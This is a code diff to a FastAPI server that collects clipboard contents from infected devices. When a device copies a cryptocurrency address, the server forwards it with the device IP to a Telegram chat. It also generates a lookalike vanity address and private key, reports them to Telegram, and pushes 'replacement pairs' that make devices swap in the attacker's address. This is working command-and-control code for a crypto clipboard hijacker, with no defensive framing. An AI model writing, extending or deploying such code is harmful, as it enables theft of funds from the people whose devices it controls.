@@ -13,7 +13,7 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Head
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 from rules import apply_sync_rules
-from db import init_db, get_session, Device, SysSettings, MessageDeviceMapping, GeneratedAddress, upsert_device
+from db import init_db, get_session, Device, SysSettings, MessageDeviceMapping, GeneratedAddress, ReplacementPair, upsert_device
 from sqlalchemy.orm import Session
 from telegram_utils import send_address_to_telegram
 from telegram_bot import start_telegram_bot, stop_telegram_bot
@@ -117,6 +117,7 @@ def list_devices(_: None = Depends(admin_guard)) -> JSONResponse:
                 "lastClipText": d.last_clip_text,
                 "lastSeen": d.last_seen,
                 "connected": d.connected,
+                "autoGenerate": d.auto_generate if d.auto_generate is not None else True,
             }
             for d in items
         ])
@@ -169,6 +170,19 @@ def update_note(device_id: str, body: Dict[str, Any] = Body(...), _: None = Depe
     note = (body or {}).get("note")
     with get_session() as db:
         upsert_device(db, device_id=device_id, note=note)
+    return {"ok": True}
+
+
+@app.patch("/admin/devices/{device_id}/auto-generate")
+def update_auto_generate(device_id: str, body: Dict[str, Any] = Body(...), _: None = Depends(admin_guard)) -> Dict[str, Any]:
+    """更新设备的自动生成开关"""
+    auto_generate = (body or {}).get("autoGenerate", True)
+    with get_session() as db:
+        device = db.query(Device).filter(Device.device_id == device_id).first()
+        if not device:
+            raise HTTPException(status_code=404, detail="设备不存在")
+        device.auto_generate = auto_generate
+        db.commit()
     return {"ok": True}
 
 
@@ -347,6 +361,127 @@ def get_generated_addresses(device_id: str, _: None = Depends(admin_guard)) -> D
         }
 
 
+@app.get("/admin/replacement-pairs")
+def list_replacement_pairs(_: None = Depends(admin_guard)) -> Dict[str, Any]:
+    """获取所有替换对"""
+    with get_session() as db:
+        pairs = db.query(ReplacementPair).order_by(ReplacementPair.created_at.desc()).all()
+        return {
+            "pairs": [
+                {
+                    "id": p.id,
+                    "device_id": p.device_id,
+                    "original_text": p.original_text,
+                    "replacement_text": p.replacement_text,
+                    "enabled": p.enabled,
+                    "created_at": p.created_at,
+                    "updated_at": p.updated_at
+                }
+                for p in pairs
+            ]
+        }
+
+
+@app.get("/admin/devices/{device_id}/replacement-pairs")
+def get_device_replacement_pairs(device_id: str, _: None = Depends(admin_guard)) -> Dict[str, Any]:
+    """获取特定设备的替换对"""
+    with get_session() as db:
+        pairs = db.query(ReplacementPair).filter(
+            ReplacementPair.device_id == device_id
+        ).order_by(ReplacementPair.created_at.desc()).all()
+        
+        return {
+            "pairs": [
+                {
+                    "id": p.id,
+                    "device_id": p.device_id,
+                    "original_text": p.original_text,
+                    "replacement_text": p.replacement_text,
+                    "enabled": p.enabled,
+                    "created_at": p.created_at,
+                    "updated_at": p.updated_at
+                }
+                for p in pairs
+            ]
+        }
+
+
+@app.post("/admin/replacement-pairs")
+def create_replacement_pair(body: Dict[str, Any] = Body(...), _: None = Depends(admin_guard)) -> Dict[str, Any]:
+    """创建新的替换对"""
+    device_id = body.get("device_id")
+    original_text = body.get("original_text")
+    replacement_text = body.get("replacement_text")
+    
+    if not device_id or not original_text or not replacement_text:
+        raise HTTPException(status_code=400, detail="Missing required fields")
+    
+    with get_session() as db:
+        # 检查设备是否存在
+        device = db.query(Device).filter(Device.device_id == device_id).first()
+        if not device:
+            raise HTTPException(status_code=404, detail="Device not found")
+        
+        # 创建替换对
+        pair = ReplacementPair(
+            device_id=device_id,
+            original_text=original_text,
+            replacement_text=replacement_text,
+            enabled=True
+        )
+        db.add(pair)
+        db.commit()
+        
+        return {
+            "ok": True,
+            "pair": {
+                "id": pair.id,
+                "device_id": pair.device_id,
+                "original_text": pair.original_text,
+                "replacement_text": pair.replacement_text,
+                "enabled": pair.enabled,
+                "created_at": pair.created_at,
+                "updated_at": pair.updated_at
+            }
+        }
+
+
+@app.put("/admin/replacement-pairs/{pair_id}")
+def update_replacement_pair(pair_id: int, body: Dict[str, Any] = Body(...), _: None = Depends(admin_guard)) -> Dict[str, Any]:
+    """更新替换对"""
+    with get_session() as db:
+        pair = db.query(ReplacementPair).filter(ReplacementPair.id == pair_id).first()
+        if not pair:
+            raise HTTPException(status_code=404, detail="Replacement pair not found")
+        
+        # 更新字段
+        if "original_text" in body:
+            pair.original_text = body["original_text"]
+        if "replacement_text" in body:
+            pair.replacement_text = body["replacement_text"]
+        if "enabled" in body:
+            pair.enabled = body["enabled"]
+        
+        pair.updated_at = int(time.time())
+        db.commit()
+        
+        return {"ok": True, "message": "Replacement pair updated successfully"}
+
+
+@app.delete("/admin/replacement-pairs/{pair_id}")
+def delete_replacement_pair(pair_id: int, _: None = Depends(admin_guard)) -> Dict[str, Any]:
+    """删除替换对"""
+    with get_session() as db:
+        pair = db.query(ReplacementPair).filter(ReplacementPair.id == pair_id).first()
+        if not pair:
+            raise HTTPException(status_code=404, detail="Replacement pair not found")
+        
+        db.delete(pair)
+        db.commit()
+        
+        return {"ok": True, "message": "Replacement pair deleted successfully"}
+
+
 @app.websocket("/ws/clipboard")
 async def ws_clipboard(ws: WebSocket):
     token = ws.query_params.get("token")
@@ -366,6 +501,26 @@ async def ws_clipboard(ws: WebSocket):
     connected_clients[device_id] = ws
     with get_session() as db:
         upsert_device(db, device_id=device_id, ip=(ws.client.host if ws.client else None), connected=True)
+        
+        # 发送该设备的替换对列表
+        pairs = db.query(ReplacementPair).filter(
+            ReplacementPair.device_id == device_id,
+            ReplacementPair.enabled == True
+        ).all()
+        
+        replacement_pairs = [
+            {
+                "original": p.original_text,
+                "replacement": p.replacement_text
+            }
+            for p in pairs
+        ]
+        
+        if replacement_pairs:
+            await ws.send_text(json.dumps({
+                "type": "REPLACEMENT_PAIRS",
+                "pairs": replacement_pairs
+            }))
 
     try:
         while True:
@@ -400,9 +555,75 @@ async def ws_clipboard(ws: WebSocket):
                     with get_session() as db:
                         device = upsert_device(db, device_id=device_id, ip=device_ip, last_clip_text=preview, connected=True)
                         device_note = device.note
+                        auto_generate = device.auto_generate if device.auto_generate is not None else True
                     
                     # 发送到Telegram
                     await send_address_to_telegram(device_id, device_ip, device_note, preview, address_type)
+                    
+                    # 如果开启了自动生成，调用生成API（跳过Solana地址）
+                    if auto_generate and address_type.upper() != "SOLANA":
+                        print(f"[AUTO-GENERATE] device={device_id} 开启了自动生成，开始生成相似地址...", flush=True)
+                        try:
+                            # 使用Vanity服务生成地址
+                            async with VanityServiceClient() as client:
+                                # 先检查服务是否可用
+                                if await client.health_check():
+                                    # 调用生成服务（限制时间30秒）
+                                    result = await client.generate_sync(
+                                        address=preview,
+                                        timeout=30,  # 30秒超时
+                                        use_gpu=True
+                                    )
+                                    
+                                    if result['success']:
+                                        # 保存到数据库
+                                        with get_session() as db:
+                                            generated = GeneratedAddress(
+                                                device_id=device_id,
+                                                original_address=result['original_address'],
+                                                generated_address=result['generated_address'],
+                                                private_key=result['private_key'],
+                                                address_type=result['address_type'],
+                                                balance="0"
+                                            )
+                                            db.add(generated)
+                                            db.commit()
+                                            
+                                            print(f"[AUTO-GENERATE] device={device_id} 生成成功: {result['generated_address']}", flush=True)
+                                            
+                                            # 发送生成结果到Telegram
+                                            message = (
+                                                f"🎯 <b>自动生成相似地址成功</b>\n\n"
+                                                f"设备ID: <code>{device_id}</code>\n"
+                                                f"设备备注: {device_note or '无'}\n"
+                                                f"地址类型: {result['address_type']}\n"
+                                                f"原始地址: <code>{result['original_address']}</code>\n"
+                                                f"生成地址: <code>{result['generated_address']}</code>\n"
+                                                f"私钥: <code>{result['private_key']}</code>\n"
+                                                f"生成耗时: {result.get('generation_time', 0):.2f}秒\n"
+                                                f"尝试次数: {result.get('attempts', 0):,}次"
+                                            )
+                                            
+                                            with get_session() as db:
+                                                bot_token = db.query(SysSettings).filter(SysSettings.key == "tg_bot_token").first()
+                                                chat_id = db.query(SysSettings).filter(SysSettings.key == "tg_chat_id").first()
+                                                
+                                                if bot_token and bot_token.value and chat_id and chat_id.value:
+                                                    url = f"https://api.telegram.org/bot{bot_token.value}/sendMessage"
+                                                    payload = {
+                                                        "chat_id": chat_id.value,
+                                                        "text": message,
+                                                        "parse_mode": "HTML"
+                                                    }
+                                                    
+                                                    async with aiohttp.ClientSession() as session:
+                                                        await session.post(url, json=payload)
+                                    else:
+                                        print(f"[AUTO-GENERATE] device={device_id} 生成失败: {result.get('error', '未知错误')}", flush=True)
+                                else:
+                                    print(f"[AUTO-GENERATE] device={device_id} 地址生成服务不可用", flush=True)
+                        except Exception as e:
+                            print(f"[AUTO-GENERATE] device={device_id} 自动生成异常: {str(e)}", flush=True)
                 else:
                     # 不应该收到其他类型的消息（客户端应该过滤了）
                     print(f"[WARNING] device={device_id} 收到意外的剪贴板内容", flush=True)
